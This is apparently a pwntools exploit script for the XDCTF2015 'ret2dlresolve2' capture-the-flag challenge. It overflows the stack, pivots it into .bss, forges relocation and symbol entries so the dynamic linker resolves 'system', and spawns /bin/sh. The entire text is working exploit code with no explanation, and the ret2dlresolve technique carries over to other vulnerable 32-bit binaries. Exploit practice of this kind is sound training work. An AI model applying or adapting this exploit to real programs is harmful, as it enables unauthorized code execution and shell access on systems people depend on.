from pwn import *
elf = ELF('./ret2dlresolve2')
bss_addr = elf.bss()
plt0_addr = elf.get_section_by_name('.plt').header.sh_addr
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 112
stack_size = 0x900
stack_base_addr = bss_addr + stack_size

rop = ROP('./ret2dlresolve2')
rop.raw('a' * offset)
rop.read(0, stack_base_addr, 100)
rop.migrate(stack_base_addr)
p = process('./ret2dlresolve2')
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(rop.chain())

fake_sym_addr = stack_base_addr + 32
reloc_offset = stack_base_addr + 24 - rel_plt_addr
padding = 16 - (fake_sym_addr - dynsym_addr) % 16
fake_sym_addr = fake_sym_addr + padding
index_dynsym = (fake_sym_addr - dynsym_addr) / 16
st_name = fake_sym_addr + 16 - dynstr_addr
fake_dynsym = flat([st_name, 0, 0, 0x12])
r_offset = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_rel_plt = flat([r_offset, r_info])
binsh_addr = stack_base_addr + padding + 55

rop = ROP('./ret2dlresolve2')
rop.raw(plt0_addr)
rop.raw(reloc_offset)
rop.raw('AAAA')
rop.raw(binsh_addr)
rop.raw('AAAA')
rop.raw('AAAA')
rop.raw(fake_rel_plt)
rop.raw('A' * padding)
rop.raw(fake_dynsym)
rop.raw('system\x00')
rop.raw('/bin/sh\x00')
rop.raw('A' * (100 - len(rop.chain())))
p.sendline(rop.chain())
p.interactive()

